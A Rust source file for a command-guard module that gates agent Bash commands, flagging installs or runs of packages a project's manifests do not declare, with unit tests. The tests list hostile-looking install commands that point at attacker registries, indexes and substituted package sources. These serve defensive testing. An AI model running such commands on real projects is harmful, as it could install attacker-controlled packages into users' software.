// SPDX-License-Identifier: Apache-2.0
//! C6: the dependency gate. A `Bash` command that installs or runs a package
//! the project does not already declare needs approval (the command guard's
//! `NeedsApproval`), with a reason naming the package.
//!
//! `origin_cmdparse::installs` finds the installs (through wrappers, `bash -c`
//! and chains); this module checks each named package against the manifests
//! from the command's (canonical) working directory up to the workspace root.
//! Always needing approval: a package from a URL, repository, tarball or path
//! (also written in the version slot, `x@npm:y`), a global install, another
//! index or registry, packages supplied at run time, a working directory that
//! cannot be resolved or lies outside the workspace, and a manifest that is
//! missing, over 1 MB or cannot be parsed (fail closed). `npx`/`npm exec` of a
//! binary already in `node_modules/.bin` is local and passes.

use std::collections::{HashMap, HashSet};
use std::path::{Path, PathBuf};

use origin_cmdparse::{Ecosystem, Form};

/// Manifests larger than this are treated as unparsable.
const MAX_MANIFEST_BYTES: u64 = 1024 * 1024;

/// Why `cmd`, run in `cwd` (relative to `root`, the workspace root) needs
/// approval as an install or run of undeclared packages; `None` when it
/// installs nothing new.
#[must_use]
pub fn reason(cmd: &str, cwd: Option<&str>, root: &Path) -> Option<String> {
    let installs = origin_cmdparse::installs(cmd);
    if installs.is_empty() {
        return None;
    }
    let dirs = workspace_dirs(cwd, root);
    let mut declared: HashMap<Ecosystem, Result<HashSet<String>, String>> = HashMap::new();
    let mut flagged: Vec<String> = Vec::new();
    for ins in &installs {
        // `pip install .`, `go get ./...`: the project itself, not a dependency.
        let named: Vec<&str> = ins
            .packages
            .iter()
            .map(String::as_str)
            .filter(|p| *p != "." && !(ins.ecosystem == Ecosystem::Go && p.starts_with('.')))
            .collect();
        if let Some(why) = &ins.always_ask {
            if ins.packages.is_empty() {
                flagged.push(format!("packages ({why})"));
            } else if !named.is_empty() {
                flagged.push(format!("{} ({why})", named.join(", ")));
            }
            continue;
        }
        for pkg in named {
            if unknown_source(ins.ecosystem, pkg) {
                flagged.push(format!("{pkg} (from a URL, repository or path)"));
                continue;
            }
            let name = package_name(ins.ecosystem, pkg);
            let known = declared.entry(ins.ecosystem).or_insert_with(|| {
                let (dir, root) = dirs.as_ref().map_err(Clone::clone)?;
                declared_packages(ins.ecosystem, dir, root)
            });
            let local = || {
                ins.form == Form::ExecLocal
                    && dirs.as_ref().is_ok_and(|(dir, root)| local_bin(&name, dir, root))
            };
            match known {
                Ok(set) if set.contains(&name) => {}
                _ if local() => {}
                Ok(_) if ins.form == Form::Add => flagged.push(name),
                Ok(_) => flagged.push(format!("{name} (runs a package from the registry)")),
                Err(why) => flagged.push(format!("{name} ({why})")),
            }
        }
    }
    (!flagged.is_empty()).then(|| {
        format!(
            "installs or runs a package the project does not declare: {}",
            flagged.join(", ")
        )
    })
}

/// The canonical working directory and workspace root. `Err` when either
/// cannot be resolved or the directory is outside the root (a symlinked or
/// `..` `cwd`).
fn workspace_dirs(cwd: Option<&str>, root: &Path) -> Result<(PathBuf, PathBuf), String> {
    let root = std::fs::canonicalize(root).map_err(|e| format!("workspace root cannot be resolved: {e}"))?;
    let dir = cwd.map_or_else(|| root.clone(), |c| root.join(c));
    let dir =
        std::fs::canonicalize(&dir).map_err(|e| format!("working directory cannot be resolved: {e}"))?;
    if dir.starts_with(&root) {
        Ok((dir, root))
    } else {
        Err("working directory is outside the workspace".into())
    }
}

/// `node_modules/.bin/<bin>` (or `<bin>.cmd`) exists from `dir` up to `root`.
/// A name with `\`, `..`, `:` or a `/` other than the one after `@scope` is
/// never local.
fn local_bin(name: &str, dir: &Path, root: &Path) -> bool {
    let bin = match name.strip_prefix('@').map(|n| n.split_once('/')) {
        Some(Some((_, bin))) => bin,
        Some(None) => return false,
        None => name,
    };
    if bin.is_empty() || bin.contains('/') || name.contains(['\\', ':']) || name.contains("..") {
        return false;
    }
    dir.ancestors().take_while(|d| d.starts_with(root)).any(|d| {
        let b = d.join("node_modules").join(".bin");
        b.join(bin).is_file() || b.join(format!("{bin}.cmd")).is_file()
    })
}

/// A package argument that is not a registry name: a URL, VCS spec, path,
/// tarball or wheel (npm `user/repo` is GitHub shorthand), also when written
/// in the version slot (`react@npm:other`, `@types/node@github:x/y`).
fn unknown_source(eco: Ecosystem, pkg: &str) -> bool {
    let a = pkg.to_ascii_lowercase();
    let version = match eco {
        Ecosystem::Npm => a.strip_prefix('@').unwrap_or(&a).split_once('@'),
        Ecosystem::Cargo | Ecosystem::Go => a.split_once('@'),
        Ecosystem::Python => None,
    };
    a.contains("://")
        || ["git+", "git@", "git:", "github:", "file:", "link:"]
            .iter()
            .any(|p| a.starts_with(p))
        || a.starts_with(['/', '\\', '~', '.'])
        || a.as_bytes().get(1) == Some(&b':')
        || [".tgz", ".tar.gz", ".tar", ".zip", ".whl"]
            .iter()
            .any(|s| a.ends_with(s))
        || version.is_some_and(|(_, v)| v.contains([':', '/']))
        || match eco {
            Ecosystem::Npm => !a.starts_with('@') && a.split('@').next().is_some_and(|n| n.contains('/')),
            Ecosystem::Go => a.contains('\\'),
            Ecosystem::Cargo | Ecosystem::Python => a.contains(['/', '\\']),
        }
}
/// The package name with its version / extras stripped (`left-pad@1.2.3`,
/// `@scope/name@^2`, `serde@1`, `requests[socks]>=2`, `example.com/mod@v1`).
fn package_name(eco: Ecosystem, pkg: &str) -> String {
    let before_at = |s: &str| s.split('@').next().unwrap_or(s).to_string();
    match eco {
        Ecosystem::Python => pep503(pkg),
        Ecosystem::Npm => pkg
            .strip_prefix('@')
            .map_or_else(|| before_at(pkg), |rest| format!("@{}", before_at(rest))),
        Ecosystem::Cargo | Ecosystem::Go => before_at(pkg),
    }
}

/// The leading distribution name of a requirement, PEP 503-normalised
/// (lower-case, runs of `-`, `_`, `.` folded to `-`).
fn pep503(req: &str) -> String {
    let mut out = String::new();
    for c in req
        .trim()
        .chars()
        .take_while(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
    {
        if c.is_ascii_alphanumeric() {
            out.push(c.to_ascii_lowercase());
        } else if !out.ends_with('-') {
            out.push('-');
        }
    }
    out
}

/// Every package declared for `eco` in the manifests from `dir` up to `root`.
/// `Err` when none exists or one cannot be read or parsed.
fn declared_packages(eco: Ecosystem, dir: &Path, root: &Path) -> Result<HashSet<String>, String> {
    let mut names = HashSet::new();
    let mut found = false;
    for d in dir.ancestors().take_while(|d| d.starts_with(root)) {
        for f in manifest_files(eco, d) {
            let text = match std::fs::metadata(&f) {
                Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
                Ok(m) if m.len() > MAX_MANIFEST_BYTES => {
                    return Err(format!("{} is over 1 MB", file_name(&f)));
                }
                _ => {
                    std::fs::read_to_string(&f).map_err(|e| format!("cannot read {}: {e}", file_name(&f)))?
                }
            };
            found = true;
            parse_manifest(eco, &f, &text, &mut names)
                .map_err(|e| format!("cannot parse {}: {e}", file_name(&f)))?;
        }
    }
    if found {
        Ok(names)
    } else {
        let what = match eco {
            Ecosystem::Npm => "package.json",
            Ecosystem::Cargo => "Cargo.toml",
            Ecosystem::Python => "requirements*.txt or pyproject.toml",
            Ecosystem::Go => "go.mod",
        };
        Err(format!("no {what} found"))
    }
}

fn file_name(p: &Path) -> String {
    p.file_name()
        .map_or_else(String::new, |n| n.to_string_lossy().into_owned())
}

fn manifest_files(eco: Ecosystem, d: &Path) -> Vec<PathBuf> {
    match eco {
        Ecosystem::Npm => vec![d.join("package.json")],
        Ecosystem::Cargo => vec![d.join("Cargo.toml")],
        Ecosystem::Go => vec![d.join("go.mod")],
        Ecosystem::Python => {
            let mut v: Vec<PathBuf> = std::fs::read_dir(d)
                .into_iter()
                .flatten()
                .flatten()
                .map(|e| e.path())
                .filter(|p| {
                    file_name(p).starts_with("requirements")
                        && p.extension().is_some_and(|e| e.eq_ignore_ascii_case("txt"))
                })
                .collect();
            v.sort();
            v.push(d.join("pyproject.toml"));
            v
        }
    }
}

fn parse_manifest(eco: Ecosystem, f: &Path, text: &str, names: &mut HashSet<String>) -> Result<(), String> {
    let is_pyproject = file_name(f) == "pyproject.toml";
    match eco {
        Ecosystem::Npm => {
            let v: serde_json::Value = serde_json::from_str(text).map_err(|e| e.to_string())?;
            for sec in [
                "dependencies",
                "devDependencies",
                "optionalDependencies",
                "peerDependencies",
            ] {
                if let Some(o) = v.get(sec).and_then(serde_json::Value::as_object) {
                    names.extend(o.keys().cloned());
                }
            }
        }
        Ecosystem::Cargo => {
            let t: toml::Table = text
                .parse()
                .map_err(|e: toml::de::Error| e.message().to_string())?;
            let ws = t.get("workspace").and_then(toml::Value::as_table);
            for sec in [
                t.get("dependencies"),
                t.get("dev-dependencies"),
                t.get("build-dependencies"),
                ws.and_then(|w| w.get("dependencies")),
            ] {
                if let Some(tbl) = sec.and_then(toml::Value::as_table) {
                    names.extend(tbl.keys().cloned());
                }
            }
        }
        Ecosystem::Python if is_pyproject => {
            let t: toml::Table = text
                .parse()
                .map_err(|e: toml::de::Error| e.message().to_string())?;
            let project = t.get("project").and_then(toml::Value::as_table);
            let groups = [
                project.and_then(|p| p.get("optional-dependencies")),
                t.get("dependency-groups"),
            ]
            .into_iter()
            .flatten()
            .filter_map(toml::Value::as_table)
            .flat_map(|tbl| tbl.values());
            let reqs = project
                .and_then(|p| p.get("dependencies"))
                .into_iter()
                .chain(groups)
                .filter_map(toml::Value::as_array)
                .flatten()
                .filter_map(toml::Value::as_str);
            names.extend(reqs.map(pep503).filter(|n| !n.is_empty()));
        }
        // ponytail: line-anchored requirement names (no PEP 508 parser in the
        // workspace); an `-e`/URL-only line declares nothing here.
        Ecosystem::Python => {
            let lines = text.lines().map(str::trim).filter(|l| !l.starts_with(['#', '-']));
            names.extend(lines.map(pep503).filter(|n| !n.is_empty()));
        }
        // ponytail: line-anchored `require` parsing (no go.mod parser in the
        // workspace); `replace`/`exclude` directives are not read.
        Ecosystem::Go => {
            let mut block = false;
            for l in text.lines().map(str::trim) {
                let module = if block {
                    block = !l.starts_with(')');
                    l
                } else if let Some(r) = l.strip_prefix("require ").map(str::trim) {
                    block = r.starts_with('(');
                    r
                } else {
                    continue;
                };
                if let Some(m) = module
                    .split_whitespace()
                    .next()
                    .filter(|m| !m.starts_with(['(', ')', '/']))
                {
                    names.insert(m.to_string());
                }
            }
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::reason;
    use std::path::Path;

    fn project(files: &[(&str, &str)]) -> tempfile::TempDir {
        let d = tempfile::tempdir().expect("tempdir");
        for (name, body) in files {
            let p = d.path().join(name);
            std::fs::create_dir_all(p.parent().expect("parent")).expect("mkdir");
            std::fs::write(p, body).expect("write");
        }
        d
    }

    fn gate(root: &Path, cmd: &str) -> Option<String> {
        reason(cmd, None, root)
    }

    #[test]
    fn npm_install_of_an_undeclared_package_needs_approval() {
        let d = project(&[(
            "package.json",
            r#"{"dependencies":{"react":"^18"},"devDependencies":{"@types/node":"1"}}"#,
        )]);
        let r = gate(d.path(), "npm install left-pad").expect("undeclared ⇒ approval");
        assert!(r.contains("left-pad"), "{r}");
        assert_eq!(gate(d.path(), "npm install"), None, "no package named");
        assert_eq!(gate(d.path(), "npm ci"), None);
        assert_eq!(
            gate(d.path(), "sudo npm install react@18.3.1"),
            None,
            "declared, version stripped"
        );
        assert_eq!(
            gate(d.path(), "pnpm add -D @types/node@^20"),
            None,
            "scoped, version stripped"
        );
        assert!(gate(d.path(), "npm i -g react").is_some(), "global ⇒ approval");
        for src in [
            "git+https://x/y.git",
            "user/repo",
            "./local",
            "../pkg.tgz",
            "https://x/a.tgz",
        ] {
            assert!(gate(d.path(), &format!("npm install {src}")).is_some(), "{src}");
        }
    }

    #[test]
    fn pip_requirements_are_matched_pep503_through_a_chain() {
        let d = project(&[(
            "requirements-dev.txt",
            "# dev\nRequests_OAuthlib==1.3\n-r base.txt\n",
        )]);
        let cmd = "cd app && pip install requests==2.31";
        let r = gate(d.path(), cmd).expect("requests absent ⇒ approval");
        assert!(r.contains("requests"), "{r}");
        assert_eq!(gate(d.path(), "pip install 'requests-oauthlib[socks]>=1'"), None);
        std::fs::write(d.path().join("requirements.txt"), "requests>=2\n").expect("write");
        assert_eq!(gate(d.path(), cmd), None, "requests present");
        assert_eq!(gate(d.path(), "pip install -r requirements.txt"), None);
        assert_eq!(gate(d.path(), "pip install -e ."), None);
        assert!(
            gate(d.path(), "pip install -e ../other").is_some(),
            "path ⇒ approval"
        );
    }

    #[test]
    fn pyproject_and_go_mod_declare_packages() {
        let d = project(&[
            (
                "pyproject.toml",
                "[project]\ndependencies = [\"Flask.Login>=1\"]\n[dependency-groups]\ndev = [\"pytest\"]\n",
            ),
            ("go.mod", "module m\n\nrequire example.com/a v1.0.0\nrequire (\n\texample.com/b v1.2.0 // indirect\n)\n"),
        ]);
        assert_eq!(gate(d.path(), "uv pip install flask_login pytest"), None);
        assert_eq!(gate(d.path(), "go get example.com/b@v1.3.0 example.com/a"), None);
        assert!(gate(d.path(), "go get example.com/c@v1.2.0").is_some());
        assert_eq!(gate(d.path(), "go get ./..."), None);
        assert_eq!(gate(d.path(), "go get"), None);
    }

    #[test]
    fn cargo_add_checks_every_dependency_table_and_fails_closed() {
        let d = project(&[
            (
                "Cargo.toml",
                "[workspace.dependencies]\ntokio = \"1\"\n[dependencies.serde]\nversion = \"1\"\n",
            ),
            ("crates/x/Cargo.toml", "[dev-dependencies]\nproptest = \"1\"\n"),
        ]);
        let member = Some("crates/x");
        for declared in [
            "cargo add serde@1",
            "bash -c \"cargo add tokio\"",
            "cargo add --dev proptest",
        ] {
            assert_eq!(reason(declared, member, d.path()), None, "{declared}");
        }
        let r = reason("bash -c \"cargo add anyhow\"", member, d.path()).expect("absent");
        assert!(r.contains("anyhow"), "{r}");
        assert!(reason("cargo add --git https://x/y y", member, d.path()).is_some());

        std::fs::write(d.path().join("Cargo.toml"), "[dependencies\nserde = ").expect("write");
        let r = gate(d.path(), "cargo add serde").expect("unparsable manifest ⇒ fail closed");
        assert!(r.contains("cannot parse Cargo.toml"), "{r}");
        let empty = project(&[]);
        let r = gate(empty.path(), "cargo add serde").expect("missing manifest ⇒ fail closed");
        assert!(r.contains("no Cargo.toml"), "{r}");
        assert!(
            reason("cargo add serde", Some(".."), d.path()).is_some(),
            "cwd outside root"
        );
        // M2: an oversized manifest is treated as unparsable.
        std::fs::write(
            d.path().join("Cargo.toml"),
            format!("[dependencies]\nserde = \"1\"\n{}", "# pad\n".repeat(200_000)),
        )
        .expect("write");
        let r = gate(d.path(), "cargo add serde").expect("oversized manifest ⇒ fail closed");
        assert!(r.contains("over 1 MB"), "{r}");
    }

    const PKG: &str =
        r#"{"dependencies":{"react":"^18","eslint":"8"},"devDependencies":{"@types/node":"1"}}"#;

    /// I3: a source written in the version slot is not "already declared".
    #[test]
    fn a_source_in_the_version_slot_needs_approval() {
        let d = project(&[
            ("package.json", PKG),
            ("Cargo.toml", "[dependencies]\nserde = \"1\"\n"),
        ]);
        for cmd in [
            "npm install react@npm:evil-pkg",
            "npm install @types/node@github:evil/x",
            "npm install react@file:vendor",
            "cargo add serde@git:x/y",
        ] {
            assert!(gate(d.path(), cmd).is_some(), "{cmd}");
        }
        assert_eq!(gate(d.path(), "npm install react@^18.2.0 @types/node@20"), None);
    }

    /// I4 / S1 / S2: run-time lists, global installs and other indexes need
    /// approval even for declared names.
    #[test]
    fn declared_names_still_need_approval_when_fetched_otherwise() {
        let d = project(&[("package.json", PKG), ("requirements.txt", "requests\n")]);
        for cmd in [
            "xargs npm install < list.txt",
            "echo react | xargs npm install",
            "pip install -r https://x/req.txt",
            "npm install --location=global react",
            "uv pip install --system requests",
            "yarn global add react",
            "pip install --index-url https://evil requests",
            "npm install --registry https://evil react",
            "cargo install ripgrep",
            "go install example.com/tool@v1.0.0",
        ] {
            let r = gate(d.path(), cmd).unwrap_or_default();
            assert!(!r.is_empty(), "{cmd}");
        }
        assert_eq!(gate(d.path(), "pip install -r requirements.txt"), None);
        assert_eq!(gate(d.path(), "go install ./cmd/x"), None, "local build");
    }

    /// S3: `npx`/`npm exec` run a local binary without asking; registry runs
    /// need the package declared.
    #[test]
    fn run_from_registry_needs_a_local_binary_or_a_declared_package() {
        let d = project(&[
            ("package.json", PKG),
            ("node_modules/.bin/tsc.cmd", ""),
            ("pyproject.toml", "[project]\ndependencies = [\"ruff\"]\n"),
            ("app/.keep", ""),
        ]);
        assert_eq!(
            reason("npx tsc --noEmit", Some("app"), d.path()),
            None,
            "local bin, walked up"
        );
        assert_eq!(gate(d.path(), "npm exec eslint"), None, "declared");
        assert_eq!(gate(d.path(), "npx --no-install cowsay"), None);
        let r = gate(d.path(), "npx cowsay hi").expect("not local, not declared");
        assert!(r.contains("cowsay"), "{r}");
        assert!(gate(d.path(), "pnpm dlx tsc").is_some(), "dlx ignores local bins");
        assert_eq!(gate(d.path(), "yarn dlx eslint"), None, "declared");
        assert_eq!(gate(d.path(), "uvx ruff check"), None, "declared");
        for cmd in ["bunx cowsay", "uvx black", "pipx run black"] {
            assert!(gate(d.path(), cmd).is_some(), "{cmd}");
        }
    }

    /// Round 2: wrapper option shapes, bare installs with another index, glued
    /// sources, `uv tool run`/`pnpx`, and `-p` package values all ask.
    #[test]
    fn round_two_forms_ask_even_for_declared_names() {
        let d = project(&[
            ("package.json", PKG),
            ("requirements.txt", "requests\n"),
            ("node_modules/.bin/tsc", ""),
        ]);
        for cmd in [
            "sudo -u ci -H npm install left-pad",
            "timeout -k 5 -s KILL 10 npm install left-pad",
            "pip install -r requirements.txt --index-url https://evil/simple",
            "npm install --registry https://evil.example",
            "npm ci --registry https://evil.example",
            "PIP_INDEX_URL=https://evil pip install requests",
            "npm_config_registry=https://evil npm install react",
            "pip install -ihttps://evil/simple requests",
            "pip install -r/dev/stdin",
            "uv tool run black",
            "pnpx cowsay",
            "npx -p tsc tsc",
        ] {
            assert!(gate(d.path(), cmd).is_some(), "{cmd}");
        }
        assert_eq!(gate(d.path(), "npx tsc"), None, "local binary");
        assert_eq!(gate(d.path(), "npx -p eslint eslint"), None, "declared package");
        assert_eq!(gate(d.path(), "npm ci"), None);
        assert_eq!(
            gate(d.path(), "sudo -u ci -H npm install react"),
            None,
            "declared"
        );
    }

    /// S3 (iii): a name that could leave `node_modules/.bin` is never local.
    #[test]
    fn local_bin_refuses_path_like_names() {
        let d = project(&[("node_modules/.bin/tsc", ""), ("node_modules/.bin/cli", "")]);
        let (dir, root) = (d.path(), d.path());
        assert!(super::local_bin("tsc", dir, root));
        assert!(super::local_bin("@scope/cli", dir, root));
        for bad in [
            "../x",
            "a/tsc",
            "@scope/a/cli",
            "..\\tsc",
            "c:tsc",
            "@scope",
            "@../cli",
        ] {
            assert!(!super::local_bin(bad, dir, root), "{bad}");
        }
    }

    /// S4: `uv add` checks the Python manifest like `cargo add`.
    #[test]
    fn uv_add_checks_the_python_manifest() {
        let d = project(&[("pyproject.toml", "[project]\ndependencies = [\"httpx>=0.27\"]\n")]);
        assert_eq!(gate(d.path(), "uv add httpx"), None);
        assert!(gate(d.path(), "uv add requests").is_some_and(|r| r.contains("requests")));
    }

    /// S5: the working directory is canonicalised before the walk.
    #[test]
    fn working_directory_must_resolve_inside_the_workspace() {
        let outside = project(&[("package.json", r#"{"dependencies":{"left-pad":"1"}}"#)]);
        let d = project(&[("package.json", PKG)]);
        let r = reason("npm install react", Some("missing"), d.path()).expect("unresolvable");
        assert!(r.contains("cannot be resolved"), "{r}");
        let abs = outside.path().to_string_lossy().into_owned();
        let r = reason("npm install left-pad", Some(&abs), d.path()).expect("outside");
        assert!(r.contains("outside the workspace"), "{r}");
        // A symlinked cwd pointing outside (when this host lets us create one).
        let link = d.path().join("link");
        #[cfg(unix)]
        let made = std::os::unix::fs::symlink(outside.path(), &link).is_ok();
        #[cfg(windows)]
        let made = std::os::windows::fs::symlink_dir(outside.path(), &link).is_ok();
        if made {
            let r = reason("npm install left-pad", Some("link"), d.path()).expect("symlink outside");
            assert!(r.contains("outside the workspace"), "{r}");
        }
    }
}
